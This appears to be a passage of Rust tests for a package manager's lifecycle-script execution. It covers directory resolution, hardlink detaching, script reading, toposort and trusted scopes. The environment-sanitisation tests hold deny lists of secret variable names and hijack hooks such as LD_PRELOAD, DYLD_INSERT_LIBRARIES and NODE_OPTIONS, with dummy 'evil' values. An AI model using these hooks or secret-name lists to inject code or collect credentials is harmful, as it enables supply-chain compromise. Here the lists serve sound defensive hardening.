use super::package_dir::{live_package_dir, live_package_dir_with_v2};
use super::script_execution::{build_lifecycle_path, platform_shell_invocation};
use super::trust::{classify_package_worst_tier, is_scope_trusted, name_matches_trusted_scope};
use super::*;
use lpm_security::script_hash::compute_script_hash;
use lpm_security::triage::StaticTier;
use lpm_store::PackageStore;
use std::collections::{HashMap, HashSet};
use std::path::Path;

fn write_store_package(
    store: &PackageStore,
    name: &str,
    version: &str,
    scripts_json: &str,
    built: bool,
) {
    let pkg_dir = store.package_dir(name, version);
    std::fs::create_dir_all(&pkg_dir).unwrap();
    std::fs::write(
        pkg_dir.join("package.json"),
        format!(
            "{{\"name\":\"{}\",\"version\":\"{}\",\"scripts\":{}}}",
            name, version, scripts_json
        ),
    )
    .unwrap();
    if built {
        std::fs::write(pkg_dir.join(BUILD_MARKER), "").unwrap();
    }
    // `find_installed_package_baseline`'s
    // v1 fallback requires `.integrity` to be Some (sentinel for
    // "package was extracted by the install pipeline"). Without
    // this, the v1 fallback returns None and these tests' helper
    // calls silently skip every fixture entry. Real installs always
    // write `.integrity`; this synthesizes the same shape.
    std::fs::write(pkg_dir.join(".integrity"), "sha512-test-fake").unwrap();
}

// ── live_package_dir tests ─────────────────────────
//
// The fix for the esbuild postinstall failure: lifecycle scripts
// must run from the live per-package node_modules directory, not
// the global content-addressable store. These tests pin the layout
// probe across both linker modes + the pathological fallback so
// a future linker-layout change doesn't silently break the dep
// resolution that postinstall scripts rely on.

fn seed_live_package_identity(path: &std::path::Path, name: &str, version: &str) {
    std::fs::create_dir_all(path).unwrap();
    std::fs::write(
        path.join("package.json"),
        format!(r#"{{"name":"{name}","version":"{version}"}}"#),
    )
    .unwrap();
}

#[test]
fn live_package_dir_resolves_isolated_layout() {
    // Isolated layout (default `LPM_LINKER` value): packages live
    // under the wrapper root (`<project>/.lpm/wrappers/`)
    // at `<wrapper-root>/<safe_name>@<version>/node_modules/<name>/`,
    // with sibling deps symlinked at the parallel `node_modules/`
    // level. Path resolved through `LayoutPaths` so tests track
    // production semantics on a relayout.
    let project = tempfile::tempdir().unwrap();
    let layout = lpm_linker::LayoutPaths::for_project(project.path());
    let live = layout
        .isolated_wrapper_dir("esbuild@0.21.5")
        .join("node_modules")
        .join("esbuild");
    seed_live_package_identity(&live, "esbuild", "0.21.5");
    let store_fallback = std::path::PathBuf::from("/store/should-not-be-used");

    let resolved = live_package_dir(
        project.path(),
        PackageLookupIdentity::new("esbuild", "0.21.5", None, None, None),
        &store_fallback,
        None,
    );
    assert_eq!(resolved, live);
}

#[test]
fn live_package_dir_resolves_isolated_scoped_name() {
    // Scoped names get path-separator sanitization (`/` → `+`) for
    // the wrapper segment, but the inner `node_modules/<name>/`
    // segment uses the original scoped form. Without this the lookup
    // would miss every `@scope/pkg` package — i.e., the entire
    // esbuild-platform / vue-loader / babel-plugin / etc. ecosystem.
    let project = tempfile::tempdir().unwrap();
    let layout = lpm_linker::LayoutPaths::for_project(project.path());
    let live = layout
        .isolated_wrapper_dir("@esbuild+darwin-arm64@0.21.5")
        .join("node_modules")
        .join("@esbuild")
        .join("darwin-arm64");
    seed_live_package_identity(&live, "@esbuild/darwin-arm64", "0.21.5");
    let store_fallback = std::path::PathBuf::from("/store/should-not-be-used");

    let resolved = live_package_dir(
        project.path(),
        PackageLookupIdentity::new("@esbuild/darwin-arm64", "0.21.5", None, None, None),
        &store_fallback,
        None,
    );
    assert_eq!(resolved, live);
}

#[test]
fn live_package_dir_resolves_hoisted_layout() {
    // Hoisted layout (opt-in via `LPM_LINKER=hoisted`): packages
    // live directly at `node_modules/<name>/` without the .lpm/
    // staging tier. The probe falls back to this when the isolated
    // path doesn't exist.
    let project = tempfile::tempdir().unwrap();
    let live = project.path().join("node_modules").join("esbuild");
    seed_live_package_identity(&live, "esbuild", "0.21.5");
    let store_fallback = std::path::PathBuf::from("/store/should-not-be-used");

    let resolved = live_package_dir(
        project.path(),
        PackageLookupIdentity::new("esbuild", "0.21.5", None, None, None),
        &store_fallback,
        None,
    );
    assert_eq!(resolved, live);
}

#[test]
fn live_package_dir_resolves_the_matching_nested_hoisted_identity() {
    let project = tempfile::tempdir().unwrap();
    let root = project.path().join("node_modules/shared");
    let nested = project
        .path()
        .join("node_modules/consumer/node_modules/shared");
    for (directory, version, integrity) in [
        (&root, "1.0.0", "sha512-root"),
        (&nested, "2.0.0", "sha512-nested"),
    ] {
        std::fs::create_dir_all(directory).unwrap();
        std::fs::write(
            directory.join("package.json"),
            format!(r#"{{"name":"shared","version":"{version}"}}"#),
        )
        .unwrap();
        std::fs::write(directory.join(".integrity"), integrity).unwrap();
    }
    let store_path = project.path().join("store/v1/shared@2.0.0");

    let resolved = live_package_dir_with_v2(
        project.path(),
        PackageLookupIdentity::new(
            "shared",
            "2.0.0",
            None,
            Some("npm-exact"),
            Some("sha512-nested"),
        ),
        &store_path,
        None,
        None,
    );

    assert_eq!(resolved, nested);
}

#[test]
fn live_package_dir_falls_back_to_store_when_unlinked() {
    // Pathological case: package isn't actually linked anywhere.
    // Lifecycle script gating upstream should prevent this from
    // running scripts in production, but if it does, fall back to
    // the existing behavior (store_path) so failures match what
    // users were already seeing rather than introducing a new "no
    // working directory" error class.
    //
    // — use `live_package_dir_with_v2(None, None)` so the v2
    // store walk is fully disabled. The env-coupled
    // `live_package_dir` would otherwise probe the developer's
    // real `~/.lpm/store/v2/links/` and find a stale entry from
    // an earlier install (e.g. `esbuild@0.21.5` from a prior
    // bench run) — flaky test isolation.
    let project = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(project.path().join("node_modules")).unwrap();
    let store_fallback = std::path::PathBuf::from("/store/some/where");

    let resolved = live_package_dir_with_v2(
        project.path(),
        PackageLookupIdentity::new("esbuild", "0.21.5", None, None, None),
        &store_fallback,
        None,
        None,
    );
    assert_eq!(resolved, store_fallback);
}

/// An unindexed project symlink is not sufficient evidence for lifecycle
/// execution. Production v2 callers resolve through the exact project-scoped
/// baseline index; without it, the lookup fails closed instead of following a
/// replaceable root link.
#[test]
#[cfg(unix)]
fn live_package_dir_rejects_an_unindexed_project_symlink() {
    let project = tempfile::tempdir().unwrap();
    let nm = project.path().join("node_modules");
    std::fs::create_dir_all(&nm).unwrap();

    let link_entry = project
        .path()
        .join("fake-store/v2/links/express@4.21.0+abc/node_modules/express");
    seed_live_package_identity(&link_entry, "express", "4.21.0");
    std::os::unix::fs::symlink(&link_entry, nm.join("express")).unwrap();
    let store_fallback = std::path::PathBuf::from("/store/should-not-be-used");

    let resolved = live_package_dir_with_v2(
        project.path(),
        PackageLookupIdentity::new("express", "4.21.0", None, None, None),
        &store_fallback,
        None,
        None,
    );
    assert_eq!(resolved, store_fallback);
}

/// — transitive deps under v2: no project-side symlink
/// exists, so `live_package_dir_with_v2` walks the v2 store via
/// `find_link_package_dir` and returns the canonical link-entry
/// package dir.
#[test]
fn live_package_dir_resolves_v2_transitive_via_store_walk() {
    use lpm_store::v2::{LinkEntryRequest, Store as V2Store};

    let project = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(project.path().join("node_modules")).unwrap();

    let store_dir = tempfile::tempdir().unwrap();
    let v2_store = V2Store::at(store_dir.path());

    // Materialize one link entry for a "transitive-only" package
    // (no project-side symlink).
    let sri = lpm_store::compute_sri_hash(b"live_package_dir_v2_transitive");
    let object_dir = {
        use std::io::Write;

        let mut tar_data = Vec::new();
        {
            let mut builder = tar::Builder::new(&mut tar_data);
            let content = b"{\"name\":\"deeply-nested\",\"version\":\"1.0.0\"}";
            let mut header = tar::Header::new_gnu();
            header.set_size(content.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder
                .append_data(&mut header, "package/package.json", &content[..])
                .unwrap();
            builder.finish().unwrap();
        }
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        encoder.write_all(&tar_data).unwrap();
        let tarball = encoder.finish().unwrap();
        v2_store.extract_object(&sri, &tarball).unwrap()
    };

    let inputs = lpm_store::v2::GraphKeyInputs::new(
        "deeply-nested",
        "1.0.0",
        lpm_store::v2::PlatformTuple::current(),
        lpm_store::v2::LinkerModeTag::Isolated,
    );
    let key = lpm_store::v2::GraphKey::derive(&inputs);
    let entry = v2_store
        .populate_link_entry(LinkEntryRequest {
            graph_key: std::sync::Arc::new(key),
            source_sri: sri.clone(),
            object_dir,
            deps: vec![],
            platform: std::sync::Arc::new(lpm_store::v2::LinkMetaPlatform {
                os: "darwin".into(),
                cpu: "arm64".into(),
                libc: None,
            }),
        })
        .unwrap();
    let expected = entry.link_dir.join("node_modules").join("deeply-nested");

    let store_fallback = std::path::PathBuf::from("/store/should-not-be-used");
    let resolved = live_package_dir_with_v2(
        project.path(),
        PackageLookupIdentity::new("deeply-nested", "1.0.0", None, None, Some(&sri)),
        &store_fallback,
        Some(&v2_store),
        None,
    );
    assert_eq!(resolved, expected);
}

#[test]
#[cfg(unix)]
fn live_package_dir_uses_exact_v2_identity_before_a_same_name_hoist() {
    use std::sync::Arc;

    use lpm_store::v2::{
        GraphKey, GraphKeyInputs, LinkMeta, LinkMetaDep, LinkMetaPlatform, LinkerModeTag,
        PlatformTuple, Store as V2Store,
    };

    let project = tempfile::tempdir().unwrap();
    let node_modules = project.path().join("node_modules");
    std::fs::create_dir_all(&node_modules).unwrap();
    let store_dir = tempfile::tempdir().unwrap();
    let lpm_root = lpm_common::LpmRoot::from_dir(store_dir.path());
    let store = V2Store::from_lpm_root(&lpm_root);
    let platform = PlatformTuple::current();
    let meta_platform = Arc::new(LinkMetaPlatform {
        os: "darwin".into(),
        cpu: "arm64".into(),
        libc: None,
    });

    let correct_sri = lpm_store::compute_sri_hash(b"approved nested source");
    let correct_key = GraphKey::derive(
        &GraphKeyInputs::new("shared", "1.0.0", platform.clone(), LinkerModeTag::Hoisted)
            .with_source_identity(Some("source-correct\0project-qualified".into())),
    );
    let correct_link_dir = store.paths().links_root().join(correct_key.dir_name());
    let correct_package_dir = correct_link_dir.join("node_modules/shared");
    std::fs::create_dir_all(&correct_package_dir).unwrap();
    LinkMeta::new(
        &correct_key,
        &correct_sri,
        "objects/correct",
        Vec::new(),
        Arc::clone(&meta_platform),
    )
    .write_to(&correct_link_dir)
    .unwrap();

    let wrong_sri = lpm_store::compute_sri_hash(b"unapproved root source");
    let wrong_key = GraphKey::derive(
        &GraphKeyInputs::new("shared", "1.0.0", platform, LinkerModeTag::Hoisted)
            .with_source_identity(Some("source-wrong\0project-qualified".into())),
    );
    let wrong_link_dir = store.paths().links_root().join(wrong_key.dir_name());
    let wrong_package_dir = wrong_link_dir.join("node_modules/shared");
    std::fs::create_dir_all(&wrong_package_dir).unwrap();
    LinkMeta::new(
        &wrong_key,
        &wrong_sri,
        "objects/wrong",
        vec![LinkMetaDep {
            local: "nested-shared".into(),
            target_graph_key: correct_key.digest_hex(),
            target_name: "shared".into(),
            target_version: "1.0.0".into(),
        }],
        meta_platform,
    )
    .write_to(&wrong_link_dir)
    .unwrap();
    std::os::unix::fs::symlink(&wrong_package_dir, node_modules.join("shared")).unwrap();

    let index = lpm_store::V2BaselineIndex::for_project(project.path(), &lpm_root).unwrap();
    let fallback = std::path::PathBuf::from("/store/should-not-be-used");

    let resolved = live_package_dir_with_v2(
        project.path(),
        PackageLookupIdentity::new(
            "shared",
            "1.0.0",
            None,
            Some("source-correct"),
            Some(&correct_sri),
        ),
        &fallback,
        Some(&store),
        Some(&index),
    );

    assert_eq!(resolved, correct_package_dir);
}

#[test]
fn live_package_dir_prefers_isolated_when_both_exist() {
    // If a project somehow has both layouts on disk simultaneously
    // (rare — would mean a mid-transition install), the isolated
    // path wins because it's the default linker mode and matches
    // the per-package symlink graph the linker creates.
    let project = tempfile::tempdir().unwrap();
    let layout = lpm_linker::LayoutPaths::for_project(project.path());
    let isolated = layout
        .isolated_wrapper_dir("esbuild@0.21.5")
        .join("node_modules")
        .join("esbuild");
    seed_live_package_identity(&isolated, "esbuild", "0.21.5");
    let hoisted = project.path().join("node_modules").join("esbuild");
    seed_live_package_identity(&hoisted, "esbuild", "0.21.5");
    let store_fallback = std::path::PathBuf::from("/store/should-not-be-used");

    let resolved = live_package_dir(
        project.path(),
        PackageLookupIdentity::new("esbuild", "0.21.5", None, None, None),
        &store_fallback,
        None,
    );
    assert_eq!(resolved, isolated);
}

// ── prepare_live_package_dir tests ──────
//
// These tests pin the integration: composing `live_package_dir`
// with `lpm_linker::detach_package_hardlinks`, plus the
// semantic guard that prevents detaching anything inside the
// store root. The unit tests on `detach_package_hardlinks` in
// lpm-linker cover the detach primitive; these cover the
// composition that the rebuild loop actually calls.

#[test]
fn prepare_live_package_dir_returns_isolated_path_when_present() {
    let project = tempfile::tempdir().unwrap();
    let store_root = tempfile::tempdir().unwrap();
    let store_pkg = store_root.path().join("esbuild@0.21.5");
    std::fs::create_dir_all(&store_pkg).unwrap();

    let layout = lpm_linker::LayoutPaths::for_project(project.path());
    let live = layout
        .isolated_wrapper_dir("esbuild@0.21.5")
        .join("node_modules")
        .join("esbuild");
    seed_live_package_identity(&live, "esbuild", "0.21.5");

    let resolved = prepare_live_package_dir(
        project.path(),
        PackageLookupIdentity::new("esbuild", "0.21.5", None, None, None),
        &store_pkg,
        store_root.path(),
        None,
    )
    .unwrap();
    assert_eq!(resolved, live);
}

#[test]
fn prepare_live_package_dir_errors_when_unlinked() {
    // Pathological "package not
    // actually linked" case. Pre-`prepare_live_package_dir`
    // returned `Ok(store_path)` here, letting the caller chdir into
    // the canonical store bytes for the lifecycle script — silent
    // store corruption on macOS/clonefile, shared-inode write on
    // Linux. Now the function hard-errors so the failure mode
    // is loud and actionable, and the canonical bytes are
    // guaranteed untouched.
    let store_root = tempfile::tempdir().unwrap();
    let store_pkg = store_root.path().join("missing-pkg@1.0.0");
    std::fs::create_dir_all(&store_pkg).unwrap();
    // Drop a file we'd notice if detach (or any write) mistakenly ran:
    let canary = store_pkg.join("package.json");
    std::fs::write(&canary, b"{\"name\":\"missing-pkg\"}").unwrap();

    // Project has NO live dir for the package, forcing
    // `live_package_dir` to return the store fallback.
    let project = tempfile::tempdir().unwrap();

    let err = prepare_live_package_dir(
        project.path(),
        PackageLookupIdentity::new("missing-pkg", "1.0.0", None, None, None),
        &store_pkg,
        store_root.path(),
        None,
    )
    .unwrap_err();
    // The error message must mention "not linked into project" so
    // support diagnostics (and the "Run `lpm install`" remediation)
    // map back to the cause.
    assert!(
        err.contains("not linked into project"),
        "expected 'not linked into project' in error, got: {err}"
    );
    assert!(
        err.contains("missing-pkg"),
        "expected package name in error, got: {err}"
    );
    // Canary intact: no detach (or any) side-effects on the store.
    assert_eq!(
        std::fs::read(&canary).unwrap(),
        b"{\"name\":\"missing-pkg\"}"
    );
}

#[cfg(target_os = "linux")]
#[test]
fn prepare_live_package_dir_detaches_hardlinks_in_isolated_layout() {
    // End-to-end integration: hardlink a file from a fake store
    // into the live isolated-layout directory, call the helper,
    // and assert the live file's inode is now distinct from the
    // store file's. Mirrors the detach unit test but exercises
    // the actual rebuild-loop entry point so a future refactor
    // that drops the detach call site fails this test.
    use std::os::unix::fs::MetadataExt;

    let project = tempfile::tempdir().unwrap();
    let store_root = tempfile::tempdir().unwrap();
    let store_pkg = store_root.path().join("esbuild@0.21.5");
    std::fs::create_dir_all(&store_pkg).unwrap();
    let store_file = store_pkg.join("package.json");
    std::fs::write(&store_file, b"{\"name\":\"esbuild\"}").unwrap();

    let layout = lpm_linker::LayoutPaths::for_project(project.path());
    let live = layout
        .isolated_wrapper_dir("esbuild@0.21.5")
        .join("node_modules")
        .join("esbuild");
    std::fs::create_dir_all(&live).unwrap();
    let live_file = live.join("package.json");
    std::fs::hard_link(&store_file, &live_file).unwrap();

    // Pre-condition: shared inode.
    assert_eq!(
        std::fs::metadata(&store_file).unwrap().ino(),
        std::fs::metadata(&live_file).unwrap().ino(),
    );

    prepare_live_package_dir(
        project.path(),
        PackageLookupIdentity::new("esbuild", "0.21.5", None, None, None),
        &store_pkg,
        store_root.path(),
        None,
    )
    .unwrap();

    // Post-condition: distinct inodes — the rebuild loop can now
    // run a postinstall script in `live` without polluting
    // `store_pkg`.
    assert_ne!(
        std::fs::metadata(&store_file).unwrap().ino(),
        std::fs::metadata(&live_file).unwrap().ino(),
    );
}

// ── build_sanitized_env tests ────────────────────────────────

#[test]
fn sanitized_env_strips_lpm_token() {
    let _env = crate::test_env::ScopedEnv::set([("LPM_TOKEN", "secret123".into())]);
    let env = build_sanitized_env();
    assert!(!env.contains_key("LPM_TOKEN"));
}

#[test]
fn sanitized_env_strips_npm_token() {
    let _env = crate::test_env::ScopedEnv::set([("NPM_TOKEN", "npm_secret".into())]);
    let env = build_sanitized_env();
    assert!(!env.contains_key("NPM_TOKEN"));
}

#[test]
fn sanitized_env_strips_suffix_patterns() {
    let _env = crate::test_env::ScopedEnv::set([
        ("MY_APP_SECRET", "val".into()),
        ("DB_PASSWORD", "val".into()),
        ("SIGNING_KEY", "val".into()),
        ("SSH_PRIVATE_KEY", "val".into()),
    ]);
    let env = build_sanitized_env();
    assert!(!env.contains_key("MY_APP_SECRET"));
    assert!(!env.contains_key("DB_PASSWORD"));
    assert!(!env.contains_key("SIGNING_KEY"));
    assert!(!env.contains_key("SSH_PRIVATE_KEY"));
}

#[test]
fn sanitized_env_strips_lowercase_exact_secret_names() {
    let _env = crate::test_env::ScopedEnv::set([
        ("github_token", "secret".into()),
        ("npm_token", "secret".into()),
    ]);
    let env = build_sanitized_env();
    assert!(!env.keys().any(|key| key == "github_token"));
    assert!(!env.keys().any(|key| key == "npm_token"));
}

#[test]
fn sanitized_env_strips_token_and_connection_string_suffixes() {
    let _env = crate::test_env::ScopedEnv::set([
        ("CLOUDFLARE_API_TOKEN", "secret".into()),
        ("DATABASE_URL", "postgres://user:pass@localhost/db".into()),
        ("REDIS_URI", "redis://:pass@localhost:6379".into()),
        (
            "SENTRY_DSN",
            "https://public:secret@example.invalid/1".into(),
        ),
        ("AWS_ACCESS_KEY_ID", "key".into()),
    ]);
    let env = build_sanitized_env();
    for key in [
        "CLOUDFLARE_API_TOKEN",
        "DATABASE_URL",
        "REDIS_URI",
        "SENTRY_DSN",
        "AWS_ACCESS_KEY_ID",
    ] {
        assert!(!env.contains_key(key), "{key} must be stripped");
    }
}

#[test]
fn sanitized_env_keeps_path() {
    // PATH and HOME are always present in the test environment
    let env = build_sanitized_env();
    assert!(env.keys().any(|key| key.eq_ignore_ascii_case("PATH")));
}

/// H13: lifecycle scripts must NOT inherit any of the
/// dynamic-linker / language-runtime hijack hooks
/// (`LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `NODE_OPTIONS`,
/// etc.). Previously the lifecycle path used a token-only denylist
/// while the dotenv loader had a runtime-hijack denylist —
/// asymmetric. Now the lifecycle list mirrors the dotenv list.
#[test]
fn sanitized_env_strips_runtime_hijack_carriers() {
    let _env = crate::test_env::ScopedEnv::set([
        ("LD_PRELOAD", "/dev/null/evil.so".into()),
        ("LD_LIBRARY_PATH", "/dev/null".into()),
        ("LD_AUDIT", "/dev/null/audit.so".into()),
        ("DYLD_INSERT_LIBRARIES", "/dev/null/evil.dylib".into()),
        ("DYLD_LIBRARY_PATH", "/dev/null".into()),
        ("DYLD_FRAMEWORK_PATH", "/dev/null".into()),
        ("DYLD_FALLBACK_LIBRARY_PATH", "/dev/null".into()),
        ("NODE_OPTIONS", "--require=/dev/null".into()),
        ("PYTHONPATH", "/dev/null".into()),
        ("PYTHONSTARTUP", "/dev/null/start.py".into()),
        ("GIT_SSH_COMMAND", "/dev/null/ssh-evil".into()),
        ("BASH_ENV", "/dev/null/bashrc".into()),
        ("ENV", "/dev/null/profile".into()),
        ("PERL5OPT", "-Mevil".into()),
        ("PERL5LIB", "/dev/null".into()),
        ("RUBYOPT", "-revil".into()),
        ("RUBYLIB", "/dev/null".into()),
    ]);
    let env = build_sanitized_env();
    for hijack in [
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "LD_AUDIT",
        "DYLD_INSERT_LIBRARIES",
        "DYLD_LIBRARY_PATH",
        "DYLD_FRAMEWORK_PATH",
        "DYLD_FALLBACK_LIBRARY_PATH",
        "NODE_OPTIONS",
        "PYTHONPATH",
        "PYTHONSTARTUP",
        "GIT_SSH_COMMAND",
        "BASH_ENV",
        "ENV",
        "PERL5OPT",
        "PERL5LIB",
        "RUBYOPT",
        "RUBYLIB",
    ] {
        assert!(
            !env.contains_key(hijack),
            "{hijack} must be stripped from lifecycle env"
        );
    }
}

#[test]
fn sanitized_env_strips_cargo_rustc_wrapper_variants() {
    let _env = crate::test_env::ScopedEnv::set([
        ("RUSTC_BOOTSTRAP", "1".into()),
        ("RUSTC_WRAPPER", "/dev/null/rustc-shim".into()),
        ("RUSTC_WORKSPACE_WRAPPER", "/dev/null/rustc-shim".into()),
        ("CARGO_BUILD_RUSTC_WRAPPER", "/dev/null/rustc-shim".into()),
        (
            "CARGO_BUILD_RUSTC_WORKSPACE_WRAPPER",
            "/dev/null/rustc-shim".into(),
        ),
    ]);
    let env = build_sanitized_env();
    for name in [
        "RUSTC_BOOTSTRAP",
        "RUSTC_WRAPPER",
        "RUSTC_WORKSPACE_WRAPPER",
        "CARGO_BUILD_RUSTC_WRAPPER",
        "CARGO_BUILD_RUSTC_WORKSPACE_WRAPPER",
    ] {
        assert!(
            !env.contains_key(name),
            "{name} must be stripped from lifecycle env (rustc-wrapper hijack)"
        );
    }
}

// ── read_lifecycle_scripts tests ─────────────────────────────

#[test]
fn reads_lifecycle_scripts_from_package_json() {
    let dir = tempfile::tempdir().unwrap();
    let pkg_json = dir.path().join("package.json");
    std::fs::write(
        &pkg_json,
        r#"{"scripts":{"postinstall":"node setup.js","test":"jest"}}"#,
    )
    .unwrap();

    let scripts = read_lifecycle_scripts(&pkg_json).unwrap();
    assert_eq!(scripts.len(), 1);
    assert_eq!(scripts.get("postinstall").unwrap(), "node setup.js");
    // "test" is not a lifecycle script
    assert!(!scripts.contains_key("test"));
}

#[test]
fn reads_lifecycle_scripts_while_skipping_non_string_script_values() {
    let dir = tempfile::tempdir().unwrap();
    let pkg_json = dir.path().join("package.json");
    std::fs::write(
            &pkg_json,
            r#"{"scripts":{"postinstall":"node setup.js","preinstall":["node","setup.js"],"install":false}}"#,
        )
        .unwrap();

    let scripts = read_lifecycle_scripts(&pkg_json).unwrap();
    assert_eq!(scripts.len(), 1);
    assert_eq!(scripts.get("postinstall").unwrap(), "node setup.js");
}

#[test]
fn returns_none_when_no_lifecycle_scripts() {
    let dir = tempfile::tempdir().unwrap();
    let pkg_json = dir.path().join("package.json");
    std::fs::write(&pkg_json, r#"{"scripts":{"test":"jest","start":"node ."}}"#).unwrap();

    assert!(read_lifecycle_scripts(&pkg_json).is_none());
}

#[test]
fn returns_none_for_missing_file() {
    let path = Path::new("/nonexistent/package.json");
    assert!(read_lifecycle_scripts(path).is_none());
}

// ── toposort tests ──────────────────────────────────────────

#[test]
fn toposort_respects_dependency_order() {
    use std::path::PathBuf;

    let packages = [
        ScriptablePackage {
            name: "a".into(),
            version: "1.0.0".into(),
            source: None,
            integrity: None,
            wrapper_id: None,
            store_path: PathBuf::new(),
            pristine_path: PathBuf::new(),
            source_integrity: "sha512-unused".into(),
            graph_key_digest: None,
            scripts: HashMap::new(),
            is_built: false,
            build_marker_key: None,
            is_trusted: true,
            trust_reason: TrustReason::StrictBinding,
        },
        ScriptablePackage {
            name: "b".into(),
            version: "1.0.0".into(),
            source: None,
            integrity: None,
            wrapper_id: None,
            store_path: PathBuf::new(),
            pristine_path: PathBuf::new(),
            source_integrity: "sha512-unused".into(),
            graph_key_digest: None,
            scripts: HashMap::new(),
            is_built: false,
            build_marker_key: None,
            is_trusted: true,
            trust_reason: TrustReason::StrictBinding,
        },
    ];
    let refs: Vec<&ScriptablePackage> = packages.iter().collect();

    // b depends on a → a should come first
    let mut lockfile = lpm_lockfile::Lockfile::new();
    lockfile.packages = vec![
        lpm_lockfile::LockedPackage {
            name: "a".into(),
            version: "1.0.0".into(),
            source: None,
            integrity: None,
            registry_signatures: Vec::new(),
            registry_published_at: None,
            os: Vec::new(),
            cpu: Vec::new(),
            libc: Vec::new(),
            node_engine: None,
            optional: false,
            dependencies: vec![],
            alias_dependencies: vec![],
            peers: vec![],
            tarball: None,
        },
        lpm_lockfile::LockedPackage {
            name: "b".into(),
            version: "1.0.0".into(),
            source: None,
            integrity: None,
            registry_signatures: Vec::new(),
            registry_published_at: None,
            os: Vec::new(),
            cpu: Vec::new(),
            libc: Vec::new(),
            node_engine: None,
            optional: false,
            dependencies: vec!["a@1.0.0".into()],
            alias_dependencies: vec![],
            peers: vec![],
            tarball: None,
        },
    ];

    let sorted = toposort_packages(refs, &lockfile);
    let names: Vec<&str> = sorted.iter().map(|p| p.name.as_str()).collect();
    assert_eq!(names, vec!["a", "b"]);
}

#[test]
fn toposort_preserves_multiple_versions_of_the_same_package() {
    use std::path::PathBuf;

    let package = |version: &str| ScriptablePackage {
        name: "shared".into(),
        version: version.into(),
        source: Some("registry+https://registry.npmjs.org".into()),
        integrity: Some(format!("sha512-{version}")),
        wrapper_id: None,
        store_path: PathBuf::new(),
        pristine_path: PathBuf::new(),
        source_integrity: format!("sha512-{version}"),
        graph_key_digest: None,
        scripts: HashMap::new(),
        is_built: false,
        build_marker_key: None,
        is_trusted: true,
        trust_reason: TrustReason::StrictBinding,
    };
    let packages = [package("1.0.0"), package("2.0.0")];
    let refs = packages.iter().collect();
    let mut lockfile = lpm_lockfile::Lockfile::new();
    lockfile.packages = ["1.0.0", "2.0.0"]
        .into_iter()
        .map(|version| lpm_lockfile::LockedPackage {
            name: "shared".into(),
            version: version.into(),
            source: Some("registry+https://registry.npmjs.org".into()),
            integrity: Some(format!("sha512-{version}")),
            registry_signatures: Vec::new(),
            registry_published_at: None,
            os: Vec::new(),
            cpu: Vec::new(),
            libc: Vec::new(),
            node_engine: None,
            optional: false,
            dependencies: Vec::new(),
            alias_dependencies: Vec::new(),
            peers: Vec::new(),
            tarball: None,
        })
        .collect();

    let sorted = toposort_packages(refs, &lockfile);
    let versions = sorted
        .iter()
        .map(|package| package.version.as_str())
        .collect::<std::collections::HashSet<_>>();

    assert_eq!(sorted.len(), 2);
    assert_eq!(
        versions,
        std::collections::HashSet::from(["1.0.0", "2.0.0"])
    );
}

#[test]
fn toposort_preserves_same_version_packages_from_distinct_sources() {
    use std::path::PathBuf;

    let source_a = "directory+./fork-a";
    let source_b = "directory+./fork-b";
    let package = |source: &str| ScriptablePackage {
        name: "shared".into(),
        version: "1.0.0".into(),
        source: Some(source.into()),
        integrity: Some("sha512-identical".into()),
        wrapper_id: lpm_lockfile::Source::parse(source)
            .ok()
            .map(|source| source.source_id()),
        store_path: PathBuf::new(),
        pristine_path: PathBuf::new(),
        source_integrity: "sha512-identical".into(),
        graph_key_digest: None,
        scripts: HashMap::new(),
        is_built: false,
        build_marker_key: None,
        is_trusted: true,
        trust_reason: TrustReason::StrictBinding,
    };
    let packages = [package(source_a), package(source_b)];
    let refs = packages.iter().collect();
    let mut lockfile = lpm_lockfile::Lockfile::new();
    lockfile.packages = [source_a, source_b]
        .into_iter()
        .map(|source| lpm_lockfile::LockedPackage {
            name: "shared".into(),
            version: "1.0.0".into(),
            source: Some(source.into()),
            integrity: Some("sha512-identical".into()),
            registry_signatures: Vec::new(),
            registry_published_at: None,
            os: Vec::new(),
            cpu: Vec::new(),
            libc: Vec::new(),
            node_engine: None,
            optional: false,
            dependencies: Vec::new(),
            alias_dependencies: Vec::new(),
            peers: Vec::new(),
            tarball: None,
        })
        .collect();

    let sorted = toposort_packages(refs, &lockfile);
    let sources = sorted
        .iter()
        .filter_map(|package| package.source.as_deref())
        .collect::<std::collections::HashSet<_>>();

    assert_eq!(sorted.len(), 2);
    assert_eq!(
        sources,
        std::collections::HashSet::from([source_a, source_b])
    );
}

// ── is_scope_trusted tests ──────────────────────────────────

#[test]
fn scope_trusted_matches_glob() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("package.json"),
        r#"{"lpm":{"scripts":{"trustedScopes":["@myorg/*"]}}}"#,
    )
    .unwrap();

    assert!(is_scope_trusted("@myorg/foo", dir.path()));
    assert!(!is_scope_trusted("@other/foo", dir.path()));
}

#[test]
fn scope_trusted_exact_match() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("package.json"),
        r#"{"lpm":{"scripts":{"trustedScopes":["esbuild"]}}}"#,
    )
    .unwrap();

    assert!(is_scope_trusted("esbuild", dir.path()));
    assert!(!is_scope_trusted("esbuild-extra", dir.path()));
}

#[test]
fn all_scripted_packages_trusted_true_when_unbuilt_scripts_are_trusted() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("package.json"),
        r#"{"lpm":{"trustedDependencies":["esbuild"]}}"#,
    )
    .unwrap();

    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    write_store_package(
        &store,
        "esbuild",
        "1.0.0",
        r#"{"postinstall":"node install.js"}"#,
        false,
    );

    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    // Legacy bare-name `trustedDependencies: ["esbuild"]` matches
    // as `LegacyNameOnly`, which the strict gate treats as
    // trusted — same semantic `rebuild::run` uses.
    //
    // the policy arg is threaded but not yet
    // consulted; `ScriptPolicy::Deny` (the default) makes the
    // default-policy intent explicit. Triage-specific tests cover green-tier promotion separately.
    let trusted = all_scripted_packages_trusted(
        &lpm_root,
        &[("esbuild".to_string(), "1.0.0".to_string(), None)],
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
